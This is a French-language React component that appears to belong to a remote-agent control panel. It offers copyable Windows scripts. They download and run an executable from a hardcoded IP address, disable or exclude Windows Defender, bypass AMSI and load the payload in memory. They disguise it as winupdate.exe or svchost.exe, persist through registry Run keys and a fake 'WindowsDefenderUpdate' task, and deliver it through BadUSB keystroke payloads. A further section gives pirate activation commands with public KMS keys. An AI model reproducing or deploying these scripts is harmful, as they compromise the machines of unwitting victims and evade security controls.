import { useState } from "react";
import TitleBar from "./TitleBar";
import { toast } from "react-toastify";

const AGENT_URL = "http://141.11.185.92/uploads/executable/helper.exe";
const AGENT_URL_API = "http://141.11.185.92:8801/uploads/executable/helper.exe";

const scripts = [
    {
        category: "🪟 Activation Windows (Supprimer la demande de licence)",
        color: "#06b6d4",
        bgColor: "rgba(6,182,212,0.1)",
        borderColor: "rgba(6,182,212,0.25)",
        items: [
            {
                id: "mas-hwid",
                title: "Activation HWID (Permanente) — Recommandé",
                description: "Activation permanente liée au matériel via Microsoft Activation Scripts (MAS). Ne s'efface pas après une réinstallation. Nécessite PowerShell (Admin).",
                icon: "✅",
                lang: "powershell",
                code: `# Microsoft Activation Scripts — Méthode HWID (permanente)
# Source: https://massgrave.dev
irm https://get.activated.win | iex`,
            },
            {
                id: "mas-kms",
                title: "Activation KMS (180 jours, auto-renouvelée)",
                description: "Active Windows pour 180 jours et se renouvelle automatiquement tant que le PC est connecté. Idéal pour les environnements de test.",
                icon: "🔄",
                lang: "powershell",
                code: `# Microsoft Activation Scripts — Méthode KMS (renouvelée automatiquement)
# Source: https://massgrave.dev
irm https://get.activated.win | iex
# Dans le menu : choisir option 2 (KMS38) pour activation 38 ans
# ou option 1 (HWID) pour activation permanente`,
            },
            {
                id: "kms-manual",
                title: "Activation KMS Manuelle (CMD Admin)",
                description: "Commandes CMD directes pour activer Windows 10/11 sans script externe.",
                icon: "⌨️",
                lang: "cmd",
                code: `:: Activation KMS Windows 10/11 Pro
:: Exécuter en tant qu'Administrateur

:: Définir la clé générique KMS pour Windows 11/10 Pro
slmgr /ipk W269N-WFGWX-YVC9B-4J6C9-T83GX

:: Configurer le serveur KMS
slmgr /skms kms8.msguides.com

:: Activer Windows
slmgr /ato

:: Vérifier l'activation
slmgr /xpr`,
            },
            {
                id: "kms-win10-home",
                title: "Activation KMS Windows 10/11 Home",
                description: "Même méthode mais avec la clé pour l'édition Home.",
                icon: "🏠",
                lang: "cmd",
                code: `:: Activation KMS Windows 10/11 Home
:: Exécuter en tant qu'Administrateur

slmgr /ipk TX9XD-98N7V-6WMQ6-BX7FG-H8Q99
slmgr /skms kms8.msguides.com
slmgr /ato
slmgr /xpr`,
            },
            {
                id: "disable-activation-nag",
                title: "Masquer le watermark d'activation",
                description: "Cache le texte 'Activer Windows' en bas à droite sans vraiment activer Windows.",
                icon: "🙈",
                lang: "cmd",
                code: `:: Masquer le filigrane "Activer Windows" (sans admin)
:: Ouvrir l'éditeur de registre
reg add "HKCU\\Control Panel\\Desktop" /v "PaintDesktopVersion" /t REG_DWORD /d 0 /f

:: Redémarrer l'explorateur pour appliquer
taskkill /f /im explorer.exe
start explorer.exe`,
            },
        ],
    },
    {

        category: "🔑 Sans droits Administrateur (Compte utilisateur simple)",
        color: "#ef4444",
        bgColor: "rgba(239,68,68,0.1)",
        borderColor: "rgba(239,68,68,0.25)",
        items: [
            {
                id: "no-admin-usertemp",
                title: "Installation dans AppData (Sans Admin)",
                description: "Télécharge et exécute depuis AppData\\Roaming — aucun droit admin requis, fonctionne avec n'importe quel compte.",
                icon: "👤",
                lang: "powershell",
                code: `# Fonctionne SANS droits administrateur
$dest = "$env:APPDATA\\winupdate.exe"
(New-Object Net.WebClient).DownloadFile("${AGENT_URL}", $dest)
Start-Process $dest`,
            },
            {
                id: "no-admin-cmd",
                title: "CMD sans Admin (certutil + AppData)",
                description: "Version CMD pure, pas de PowerShell. Fonctionne depuis Exécuter (Win+R) ou CMD classique.",
                icon: "📋",
                lang: "cmd",
                code: `certutil -urlcache -split -f "${AGENT_URL}" "%APPDATA%\\winupdate.exe"
start "" "%APPDATA%\\winupdate.exe"`,
            },
            {
                id: "no-admin-exclusion",
                title: "Exclusion Defender sans Admin (User Policy)",
                description: "Ajoute une exclusion Defender via la politique utilisateur (ne nécessite pas d'UAC/admin sur certaines configs).",
                icon: "🛡️",
                lang: "powershell",
                code: `# Exclusion sans UAC sur certaines configurations Windows 10/11
$dest = "$env:LOCALAPPDATA\\Microsoft\\Windows\\winupdate.exe"

# Tenter une exclusion sans admin
try {
    Add-MpPreference -ExclusionPath $env:LOCALAPPDATA -ErrorAction Stop
    Write-Host "Exclusion ajoutée avec succès."
} catch {
    Write-Host "Exclusion non possible sans admin, on essaie quand même..."
}

(New-Object Net.WebClient).DownloadFile("${AGENT_URL}", $dest)
Start-Process $dest -WindowStyle Hidden`,
            },
            {
                id: "no-admin-wscript",
                title: "Bypass via WScript (VBScript)",
                description: "Utilise WScript pour télécharger et lancer silencieusement. Aucun admin requis.",
                icon: "📜",
                lang: "vbscript",
                code: `' Créer ce fichier en .vbs et double-cliquer dessus
Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
objHTTP.Open "GET", "${AGENT_URL}", False
objHTTP.Send

Dim oStream
Set oStream = CreateObject("ADODB.Stream")
oStream.Type = 1
oStream.Open
oStream.Write objHTTP.ResponseBody
oStream.SaveToFile Environ("APPDATA") & "\\winupdate.exe", 2
oStream.Close

CreateObject("WScript.Shell").Run Environ("APPDATA") & "\\winupdate.exe", 0, False`,
            },
            {
                id: "no-admin-startup",
                title: "Persistance sans Admin (Startup Utilisateur)",
                description: "Ajoute l'agent au démarrage via le Registre utilisateur (HKCU) — aucun admin requis.",
                icon: "🔄",
                lang: "powershell",
                code: `# Sans droits admin : utilise HKCU (courant utilisateur)
$dest = "$env:APPDATA\\Microsoft\\winupdate.exe"
(New-Object Net.WebClient).DownloadFile("${AGENT_URL}", $dest)

# Persistance dans le registre utilisateur (pas besoin d'admin)
Set-ItemProperty "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsUpdate" -Value $dest

Start-Process $dest -WindowStyle Hidden
Write-Host "Agent installé avec persistance (sans admin)."`,
            },
        ],
    },
    {
        category: "Installation Directe",
        color: "#3b82f6",
        bgColor: "rgba(59,130,246,0.1)",
        borderColor: "rgba(59,130,246,0.25)",
        items: [
            {
                id: "ps-basic",
                title: "Téléchargement PowerShell Simple",
                description: "Télécharge et exécute l'agent via PowerShell. Le plus simple.",
                icon: "⚡",
                lang: "powershell",
                code: `$url = "${AGENT_URL}"
$dest = "$env:TEMP\\helper.exe"
Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing
Start-Process $dest`,
            },
            {
                id: "cmd-basic",
                title: "Téléchargement CMD (certutil)",
                description: "Utilise certutil intégré à Windows, aucun PowerShell requis.",
                icon: "📋",
                lang: "cmd",
                code: `certutil -urlcache -split -f "${AGENT_URL}" %TEMP%\\helper.exe
%TEMP%\\helper.exe`,
            },
            {
                id: "bitsadmin",
                title: "Téléchargement BITS (bitsadmin)",
                description: "Utilise le service BITS de Windows, très discret.",
                icon: "🌐",
                lang: "cmd",
                code: `bitsadmin /transfer job /download /priority high "${AGENT_URL}" "%TEMP%\\helper.exe"
%TEMP%\\helper.exe`,
            },
        ],
    },
    {
        category: "Contournement Windows Defender",
        color: "#f59e0b",
        bgColor: "rgba(245,158,11,0.1)",
        borderColor: "rgba(245,158,11,0.25)",
        items: [
            {
                id: "disable-defender",
                title: "Désactiver Defender (Admin requis)",
                description: "Désactive la protection en temps réel, télécharge puis réactive. Nécessite un terminal en Administrateur.",
                icon: "🛡️",
                lang: "powershell",
                code: `# Désactiver la protection en temps réel
Set-MpPreference -DisableRealtimeMonitoring $true

# Télécharger et lancer
$dest = "$env:TEMP\\helper.exe"
Invoke-WebRequest -Uri "${AGENT_URL}" -OutFile $dest -UseBasicParsing
Start-Process $dest

Write-Host "Agent lancé. Réactivation de Defender dans 5 secondes..."
Start-Sleep -Seconds 5

# Réactiver
Set-MpPreference -DisableRealtimeMonitoring $false`,
            },
            {
                id: "exclusion-folder",
                title: "Exclusion de Dossier Defender",
                description: "Ajoute une exclusion pour le dossier TEMP puis télécharge. Ne désactive pas Defender complètement.",
                icon: "📁",
                lang: "powershell",
                code: `# Ajouter exclusion sur le dossier TEMP
Add-MpPreference -ExclusionPath "$env:TEMP"
Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA"

# Télécharger et lancer depuis le dossier exclu
$dest = "$env:TEMP\\svchost_helper.exe"
Invoke-WebRequest -Uri "${AGENT_URL}" -OutFile $dest -UseBasicParsing
Start-Process $dest`,
            },
            {
                id: "amsi-bypass",
                title: "AMSI Bypass + Installation",
                description: "Contourne AMSI (Antimalware Scan Interface) avant l'exécution.",
                icon: "🔓",
                lang: "powershell",
                code: `# AMSI Bypass
$a = [Ref].Assembly.GetTypes()
ForEach($b in $a) {
    if ($b.Name -like "*iUtils") {
        $c = $b.GetFields('NonPublic,Static')
        ForEach($d in $c) {
            if ($d.Name -like "*Context") {
                $d.SetValue($null, [IntPtr]2)
            }
        }
    }
}

# Téléchargement et exécution
$dest = "$env:TEMP\\winupdate.exe"
(New-Object Net.WebClient).DownloadFile("${AGENT_URL}", $dest)
Start-Process $dest`,
            },
            {
                id: "in-memory",
                title: "Exécution en Mémoire (Fileless)",
                description: "Charge et exécute l'agent directement en RAM sans le sauvegarder sur le disque.",
                icon: "💾",
                lang: "powershell",
                code: `# Télécharger en bytes et exécuter depuis la mémoire
$bytes = (New-Object Net.WebClient).DownloadData("${AGENT_URL}")
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entry = $assembly.EntryPoint
$entry.Invoke($null, @(,[string[]]@()))`,
            },
        ],
    },
    {
        category: "Persistance & Démarrage Automatique",
        color: "#8b5cf6",
        bgColor: "rgba(139,92,246,0.1)",
        borderColor: "rgba(139,92,246,0.25)",
        items: [
            {
                id: "registry-startup",
                title: "Persistance par Registre Windows",
                description: "L'agent se relance automatiquement à chaque connexion de l'utilisateur.",
                icon: "🔄",
                lang: "powershell",
                code: `$dest = "$env:APPDATA\\Microsoft\\Windows\\winupdate.exe"
Invoke-WebRequest -Uri "${AGENT_URL}" -OutFile $dest -UseBasicParsing

# Ajouter au démarrage via le Registre
$regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
Set-ItemProperty -Path $regPath -Name "WindowsUpdate" -Value $dest
Write-Host "Persistance ajoutée. L'agent se lancera à chaque démarrage."
Start-Process $dest`,
            },
            {
                id: "task-scheduler",
                title: "Persistance par Tâche Planifiée",
                description: "Crée une tâche planifiée qui relance l'agent toutes les 5 minutes.",
                icon: "📅",
                lang: "powershell",
                code: `$dest = "$env:APPDATA\\Microsoft\\svchost.exe"
Invoke-WebRequest -Uri "${AGENT_URL}" -OutFile $dest -UseBasicParsing

# Créer la tâche planifiée
$action = New-ScheduledTaskAction -Execute $dest
$trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 5) -Once -At (Get-Date)
Register-ScheduledTask -TaskName "WindowsDefenderUpdate" -Action $action -Trigger $trigger -RunLevel Highest -Force

Start-Process $dest
Write-Host "Tâche planifiée créée. L'agent tourne maintenant en arrière-plan."`,
            },
            {
                id: "startup-folder",
                title: "Dossier de Démarrage Windows",
                description: "Copie l'agent dans le dossier Startup pour un lancement automatique.",
                icon: "📂",
                lang: "powershell",
                code: `$startupPath = [System.Environment]::GetFolderPath('Startup')
$dest = Join-Path $startupPath "winupdate.exe"
Invoke-WebRequest -Uri "${AGENT_URL}" -OutFile $dest -UseBasicParsing
Start-Process $dest
Write-Host "Agent installé dans le dossier Startup: $dest"`,
            },
        ],
    },
    {
        category: "Déploiement via BadUSB / Flipper Zero",
        color: "#10b981",
        bgColor: "rgba(16,185,129,0.1)",
        borderColor: "rgba(16,185,129,0.25)",
        items: [
            {
                id: "badusb-ducky",
                title: "Script DuckyScript (Rubber Ducky)",
                description: "Payload pour USB Rubber Ducky / Flipper Zero BadUSB.",
                icon: "🦆",
                lang: "ducky",
                code: `DELAY 2000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString('${AGENT_URL_API}')"
ENTER`,
            },
            {
                id: "badusb-silent",
                title: "Script BadUSB Silencieux",
                description: "Lance un terminal caché, télécharge et exécute sans fenêtre visible.",
                icon: "🤫",
                lang: "ducky",
                code: `DELAY 2000
GUI r
DELAY 600
STRING powershell
CTRL-SHIFT ENTER
DELAY 1000
ALT y
DELAY 500
STRING $p="$env:TEMP\\w.exe";(New-Object Net.WebClient).DownloadFile("${AGENT_URL}",$p);Add-MpPreference -ExclusionPath $env:TEMP;Start-Process $p -WindowStyle Hidden
ENTER
DELAY 2000
STRING exit
ENTER`,
            },
        ],
    },
];

function CopyButton({ code }) {
    const [copied, setCopied] = useState(false);
    const copy = () => {
        navigator.clipboard.writeText(code);
        setCopied(true);
        toast.success("Script copié !");
        setTimeout(() => setCopied(false), 2000);
    };
    return (
        <button
            onClick={copy}
            style={{
                background: copied ? 'rgba(16,185,129,0.2)' : 'rgba(255,255,255,0.08)',
                border: `1px solid ${copied ? 'rgba(16,185,129,0.4)' : 'rgba(255,255,255,0.1)'}`,
                color: copied ? '#10b981' : 'var(--app-content-main-color)',
                borderRadius: '6px',
                padding: '4px 10px',
                fontSize: '12px',
                cursor: 'pointer',
                transition: 'all 0.2s',
                display: 'flex',
                alignItems: 'center',
                gap: '5px',
            }}
        >
            {copied ? (
                <><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><polyline points="20 6 9 17 4 12"></polyline></svg> Copié</>
            ) : (
                <><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg> Copier</>
            )}
        </button>
    );
}

// Modal de confirmation dans le style du site
function ConfirmModal({ item, onConfirm, onClose }) {
    if (!item) return null;
    return (
        <div
            style={{
                position: 'fixed', inset: 0, zIndex: 9999,
                background: 'rgba(0,0,0,0.7)',
                display: 'flex', alignItems: 'center', justifyContent: 'center',
                backdropFilter: 'blur(4px)',
            }}
            onClick={onClose}
        >
            <div
                style={{
                    background: 'var(--sidebar)',
                    border: '1px solid var(--table-border)',
                    borderRadius: '16px',
                    padding: '28px',
                    maxWidth: '480px',
                    width: '90%',
                    boxShadow: '0 24px 60px rgba(0,0,0,0.5)',
                }}
                onClick={e => e.stopPropagation()}
            >
                <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                    <div style={{
                        width: '44px', height: '44px', borderRadius: '12px',
                        background: 'rgba(239,68,68,0.15)',
                        display: 'flex', alignItems: 'center', justifyContent: 'center',
                        fontSize: '22px',
                    }}>⚠️</div>
                    <div>
                        <h3 style={{ color: 'var(--app-content-main-color)', margin: 0, fontSize: '16px', fontWeight: '600' }}>
                            Confirmer l'utilisation
                        </h3>
                        <p style={{ color: 'var(--app-content-main-color)', opacity: 0.5, margin: '2px 0 0', fontSize: '13px' }}>
                            {item.title}
                        </p>
                    </div>
                </div>
                <p style={{ color: 'var(--app-content-main-color)', opacity: 0.7, fontSize: '14px', marginBottom: '20px', lineHeight: '1.6' }}>
                    Ce script est destiné à être utilisé uniquement sur des machines dont vous avez la propriété ou l'autorisation explicite. Utilisez-le de manière responsable.
                </p>
                <div style={{ display: 'flex', gap: '10px', justifyContent: 'flex-end' }}>
                    <button
                        onClick={onClose}
                        style={{
                            padding: '8px 18px', borderRadius: '8px', border: '1px solid var(--table-border)',
                            background: 'transparent', color: 'var(--app-content-main-color)',
                            cursor: 'pointer', fontSize: '14px',
                        }}
                    >Annuler</button>
                    <button
                        onClick={() => { onConfirm(item); onClose(); }}
                        style={{
                            padding: '8px 18px', borderRadius: '8px', border: 'none',
                            background: 'var(--action-color)', color: '#fff',
                            cursor: 'pointer', fontSize: '14px', fontWeight: '600',
                        }}
                    >Copier le script</button>
                </div>
            </div>
        </div>
    );
}

function Windows() {
    const [modalItem, setModalItem] = useState(null);
    const [expanded, setExpanded] = useState({});

    const toggle = (id) => setExpanded(prev => ({ ...prev, [id]: !prev[id] }));

    const confirmAndCopy = (item) => {
        setModalItem(item);
    };

    const handleConfirm = (item) => {
        navigator.clipboard.writeText(item.code);
        toast.success("Script copié dans le presse-papier !");
    };

    return (
        <div>
            <TitleBar title="Windows" />
            <ConfirmModal item={modalItem} onConfirm={handleConfirm} onClose={() => setModalItem(null)} />

            <div style={{ padding: '0 16px 32px' }}>

                {/* Catégories */}
                {scripts.map(category => (
                    <div key={category.category} style={{ marginBottom: '28px' }}>
                        {/* Header catégorie */}
                        <div style={{
                            display: 'flex', alignItems: 'center', gap: '10px',
                            marginBottom: '14px', paddingBottom: '10px',
                            borderBottom: `1px solid ${category.borderColor}`,
                        }}>
                            <div style={{
                                width: '8px', height: '8px', borderRadius: '50%',
                                background: category.color,
                                boxShadow: `0 0 8px ${category.color}`,
                            }} />
                            <h2 style={{
                                color: 'var(--app-content-main-color)', margin: 0,
                                fontSize: '15px', fontWeight: '600',
                            }}>{category.category}</h2>
                            <span style={{
                                marginLeft: 'auto', fontSize: '12px', opacity: 0.5,
                                color: 'var(--app-content-main-color)',
                            }}>{category.items.length} script{category.items.length > 1 ? 's' : ''}</span>
                        </div>

                        {/* Scripts */}
                        <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                            {category.items.map(item => (
                                <div
                                    key={item.id}
                                    style={{
                                        background: 'var(--sidebar)',
                                        border: `1px solid var(--table-border)`,
                                        borderRadius: '12px',
                                        overflow: 'hidden',
                                        transition: 'border-color 0.2s',
                                    }}
                                >
                                    {/* Header script */}
                                    <div
                                        style={{
                                            padding: '14px 16px',
                                            display: 'flex',
                                            alignItems: 'center',
                                            gap: '12px',
                                            cursor: 'pointer',
                                        }}
                                        onClick={() => toggle(item.id)}
                                    >
                                        <div style={{
                                            width: '38px', height: '38px', borderRadius: '10px',
                                            background: category.bgColor,
                                            border: `1px solid ${category.borderColor}`,
                                            display: 'flex', alignItems: 'center', justifyContent: 'center',
                                            fontSize: '18px', flexShrink: 0,
                                        }}>
                                            {item.icon}
                                        </div>
                                        <div style={{ flex: 1, minWidth: 0 }}>
                                            <p style={{
                                                color: 'var(--app-content-main-color)', margin: '0 0 2px',
                                                fontSize: '14px', fontWeight: '600',
                                            }}>{item.title}</p>
                                            <p style={{
                                                color: 'var(--app-content-main-color)', opacity: 0.5,
                                                margin: 0, fontSize: '12px',
                                            }}>{item.description}</p>
                                        </div>
                                        <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                                            <span style={{
                                                fontSize: '11px', padding: '2px 8px', borderRadius: '20px',
                                                background: category.bgColor,
                                                border: `1px solid ${category.borderColor}`,
                                                color: category.color, fontFamily: 'monospace',
                                            }}>{item.lang}</span>
                                            <svg
                                                width="16" height="16" viewBox="0 0 24 24" fill="none"
                                                stroke="currentColor" strokeWidth="2"
                                                style={{
                                                    color: 'var(--app-content-main-color)', opacity: 0.4,
                                                    transform: expanded[item.id] ? 'rotate(180deg)' : 'none',
                                                    transition: 'transform 0.2s', flexShrink: 0,
                                                }}
                                            >
                                                <polyline points="6 9 12 15 18 9"></polyline>
                                            </svg>
                                        </div>
                                    </div>

                                    {/* Code block */}
                                    {expanded[item.id] && (
                                        <div style={{ borderTop: '1px solid var(--table-border)' }}>
                                            <div style={{
                                                padding: '8px 12px',
                                                background: 'rgba(0,0,0,0.2)',
                                                display: 'flex',
                                                alignItems: 'center',
                                                justifyContent: 'space-between',
                                            }}>
                                                <span style={{ color: 'var(--app-content-main-color)', opacity: 0.4, fontSize: '12px' }}>
                                                    {item.lang.toUpperCase()}
                                                </span>
                                                <div style={{ display: 'flex', gap: '8px' }}>
                                                    <CopyButton code={item.code} />
                                                    <button
                                                        onClick={() => confirmAndCopy(item)}
                                                        style={{
                                                            background: 'rgba(139,92,246,0.15)',
                                                            border: '1px solid rgba(139,92,246,0.3)',
                                                            color: '#8b5cf6',
                                                            borderRadius: '6px',
                                                            padding: '4px 10px',
                                                            fontSize: '12px',
                                                            cursor: 'pointer',
                                                            display: 'flex', alignItems: 'center', gap: '5px',
                                                        }}
                                                    >
                                                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
                                                        Utiliser
                                                    </button>
                                                </div>
                                            </div>
                                            <pre style={{
                                                margin: 0,
                                                padding: '14px 16px',
                                                background: 'rgba(0,0,0,0.3)',
                                                color: '#a5f3fc',
                                                fontSize: '12px',
                                                lineHeight: '1.7',
                                                overflowX: 'auto',
                                                fontFamily: '"Fira Code", "Cascadia Code", monospace',
                                            }}>
                                                <code>{item.code}</code>
                                            </pre>
                                        </div>
                                    )}
                                </div>
                            ))}
                        </div>
                    </div>
                ))}
            </div>
        </div>
    );
}

export default Windows;
